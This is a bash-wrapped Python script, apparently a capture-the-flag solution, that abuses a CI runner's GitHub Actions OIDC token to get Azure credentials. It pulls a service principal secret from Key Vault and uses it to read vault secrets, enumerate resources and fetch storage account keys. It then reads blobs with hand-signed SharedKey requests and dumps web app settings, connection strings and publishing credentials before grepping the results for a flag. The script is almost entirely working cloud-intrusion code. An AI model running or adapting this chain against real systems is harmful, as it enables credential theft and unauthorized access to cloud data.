#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64, datetime, hashlib, hmac, json, os, re, sys, time
import urllib.parse, urllib.request, urllib.error
import xml.etree.ElementTree as ET

TEN  = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB  = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
CICD = "72ff278a-9e71-43ec-bac4-2ca303f8e462"   # cicd-deployer (FIC)
RG_P = "rg-tbl-platform-prod-sea"
RG_R = "rg-tbl-reporting-prod-eus"
ARM  = "https://management.azure.com"
VAULTS   = ["kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"]
STORAGES = ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"]
SITES    = [("app-tbl-reporting-prod", RG_R), ("app-tbl-storefront-prod", RG_P),
            ("app-tbl-reporting-prod", RG_P), ("app-tbl-storefront-prod", RG_R)]
CONTAINERS = ["config","reports","exports","data","logs","archive","backup","secrets","private"]

BLOB = []            # everything we collect, scanned for the flag at the end
def note(tag, text):
    s = str(text)
    BLOB.append(tag + " :: " + s)
    print(tag, s[:700], flush=True)

def rq(u, m="GET", d=None, h=None, t=30):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=d, method=m, headers=h or {}), timeout=t)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, repr(e)

def fpost(u, o, t=30):
    return rq(u, "POST", urllib.parse.urlencode(o).encode(),
              {"Content-Type":"application/x-www-form-urlencoded"}, t)

# ---------- step 1: OIDC ----------
s, b = rq(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange",
          "GET", None, {"Authorization":"Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b)["value"]
print("OIDC_LEN", len(oidc), flush=True)

def fic(scope):
    s, b = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
        "client_id": CICD, "grant_type":"client_credentials", "scope": scope + "/.default",
        "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc})
    try: return json.loads(b).get("access_token","")
    except Exception: return ""

cicd_vault = fic("https://vault.azure.net")
cicd_arm   = fic("https://management.azure.com")
cicd_stor  = fic("https://storage.azure.com")
print("CICD vault/arm/storage lens:", len(cicd_vault), len(cicd_arm), len(cicd_stor), flush=True)

# ---------- step 2: SP from kv-tbl-prod ----------
sp_arm = ""; sp_vault = ""; sp_stor = ""
s, b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4",
          "GET", None, {"Authorization":"Bearer " + cicd_vault})
note("SP_SECRET_FETCH", (s, b[:200]))
try:
    sp = json.loads(json.loads(b)["value"])
    spcid = sp.get("appId") or sp.get("clientId")
    spsec = sp.get("clientSecret") or sp.get("password")
    print("SP_APPID", spcid, flush=True)
    def sptok(scope):
        s2, b2 = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
            "client_id": spcid, "grant_type":"client_credentials",
            "client_secret": spsec, "scope": scope + "/.default"})
        try: return json.loads(b2).get("access_token","")
        except Exception: return ""
    sp_arm   = sptok("https://management.azure.com")
    sp_vault = sptok("https://vault.azure.net")
    sp_stor  = sptok("https://storage.azure.com")
    print("SP arm/vault/storage lens:", len(sp_arm), len(sp_vault), len(sp_stor), flush=True)
except Exception as e:
    note("SP_PARSE_ERR", repr(e))

IDENTS = [("cicd", cicd_arm, cicd_vault, cicd_stor), ("sp", sp_arm, sp_vault, sp_stor)]

# ---------- step 3: Key Vault list + direct secret reads ----------
SECRET_NAMES = ["flag","tbl-flag","ctf-flag","FLAG","flag-value",
                "config-storage-connection","storage-connection","internal-config",
                "appcfg-storage-connection","reporting-service-principal"]
for who, a_arm, a_vault, a_stor in IDENTS:
    if not a_vault: continue
    for v in VAULTS:
        s, b = rq(f"https://{v}.vault.azure.net/secrets?api-version=7.4", "GET", None,
                  {"Authorization":"Bearer " + a_vault})
        note(f"KVLIST[{who}][{v}]", (s, b[:600]))
        for n in SECRET_NAMES:
            s2, b2 = rq(f"https://{v}.vault.azure.net/secrets/{n}?api-version=7.4", "GET", None,
                        {"Authorization":"Bearer " + a_vault})
            if s2 == 200:
                note(f"KVSECRET[{who}][{v}][{n}]", b2[:900])

# ---------- step 4: ARM enumeration ----------
for who, a_arm, _v, _s in IDENTS:
    if not a_arm: continue
    for rg in [RG_P, RG_R]:
        s, b = rq(f"{ARM}/subscriptions/{SUB}/resourceGroups/{rg}/resources?api-version=2021-04-01",
                  "GET", None, {"Authorization":"Bearer " + a_arm})
        note(f"RGLIST[{who}][{rg}]", (s, b[:1500]))
    s, b = rq(f"{ARM}/subscriptions/{SUB}/resources?api-version=2021-04-01", "GET", None,
              {"Authorization":"Bearer " + a_arm})
    note(f"SUBLIST[{who}]", (s, b[:2000]))

# ---------- step 5: storage listKeys -> SharedKey blob read ----------
def sharedkey_req(account, key, method, container, blob, query=""):
    kb = base64.b64decode(key)
    d = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    ver = "2021-08-06"
    canon = f"/{account}/{container}"
    if blob: canon += "/" + blob
    if query:
        for kv in sorted(query.split("&")):
            k, _, val = kv.partition("=")
            canon += f"\n{k}:{val}"
    sts = "\n".join([method] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{ver}", canon])
    sig = base64.b64encode(hmac.new(kb, sts.encode("utf-8"), hashlib.sha256).digest()).decode()
    url = f"https://{account}.blob.core.windows.net/{container}"
    if blob: url += "/" + blob
    if query: url += "?" + query
    return rq(url, method, None, {"x-ms-date": d, "x-ms-version": ver,
                                  "Authorization": f"SharedKey {account}:{sig}"}, 30)

SAKEYS = {}
for who, a_arm, _v, _s in IDENTS:
    if not a_arm: continue
    for sa in STORAGES:
        for rg in [RG_P, RG_R]:
            s, b = rq(f"{ARM}/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
                      "POST", b"{}", {"Authorization":"Bearer " + a_arm, "Content-Type":"application/json"})
            if s == 200:
                try:
                    k = json.loads(b)["keys"][0]["value"]
                    SAKEYS[sa] = k
                    note(f"LISTKEYS_OK[{who}][{rg}][{sa}]", "key_len=" + str(len(k)))
                except Exception as e:
                    note(f"LISTKEYS_PARSE[{who}][{sa}]", repr(e))
            else:
                note(f"LISTKEYS_FAIL[{who}][{rg}][{sa}]", (s, b[:200]))

for sa, key in SAKEYS.items():
    for c in CONTAINERS:
        s, b = sharedkey_req(sa, key, "GET", c, "", "comp=list&restype=container")
        if s != 200:
            note(f"BLOBLIST_FAIL[{sa}][{c}]", (s, b[:150])); continue
        note(f"BLOBLIST_OK[{sa}][{c}]", b[:800])
        names = []
        try:
            root = ET.fromstring(b)
            names = [n.text for n in root.iter() if n.tag.endswith("Name") and n.text]
        except Exception:
            names = re.findall(r"<Name>([^<]+)</Name>", b)
        for nm in names[:40]:
            s2, b2 = sharedkey_req(sa, key, "GET", c, nm)
            note(f"BLOB[{sa}][{c}][{nm}]", b2[:900])

# ---------- step 6: app settings / connection strings / publishing creds ----------
seen = set()
for who, a_arm, _v, _s in IDENTS:
    if not a_arm: continue
    for site, rg in SITES:
        if (who, site, rg) in seen: continue
        seen.add((who, site, rg))
        for what, apiv in [("appsettings","2022-03-01"), ("connectionstrings","2022-03-01"),
                           ("publishingcredentials","2023-01-01")]:
            s, b = rq(f"{ARM}/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}/config/{what}/list?api-version={apiv}",
                      "POST", b"{}", {"Authorization":"Bearer " + a_arm, "Content-Type":"application/json"})
            if s == 200:
                note(f"{what.upper()}[{who}][{rg}][{site}]", b[:1800])
            else:
                note(f"{what.upper()}_FAIL[{who}][{rg}][{site}]", (s, b[:150]))

# ---------- step 7: storage OAuth data-plane (no account key needed) ----------
for who, _a, _v, a_stor in IDENTS:
    if not a_stor: continue
    for sa in STORAGES:
        for c in CONTAINERS:
            s, b = rq(f"https://{sa}.blob.core.windows.net/{c}?restype=container&comp=list",
                      "GET", None, {"Authorization":"Bearer " + a_stor, "x-ms-version":"2021-08-06"})
            if s == 200:
                note(f"OAUTH_BLOBLIST[{who}][{sa}][{c}]", b[:800])
                for nm in re.findall(r"<Name>([^<]+)</Name>", b)[:30]:
                    s2, b2 = rq(f"https://{sa}.blob.core.windows.net/{c}/{urllib.parse.quote(nm)}",
                                "GET", None, {"Authorization":"Bearer " + a_stor, "x-ms-version":"2021-08-06"})
                    note(f"OAUTH_BLOB[{who}][{sa}][{c}][{nm}]", b2[:900])

# ---------- final: grep the flag out of everything ----------
hay = "\n".join(BLOB)
hits = sorted(set(re.findall(r"DF26\{[^}]{1,200}\}", hay)))
print("==================================================", flush=True)
if hits:
    for h in hits: print("CTF_FLAG=" + h, flush=True)
else:
    print("CTF_FLAG=<none found>", flush=True)
    # also surface any base64 blobs that decode to something containing DF26
    for item in BLOB:
        for tok in re.findall(r"[A-Za-z0-9+/=]{40,}", item):
            try:
                dec = base64.b64decode(tok + "=" * (-len(tok) % 4)).decode(errors="replace")
                if "DF26" in dec:
                    print("CTF_FLAG_B64=" + dec[:400], flush=True)
            except Exception:
                pass
print("==================================================", flush=True)
PY
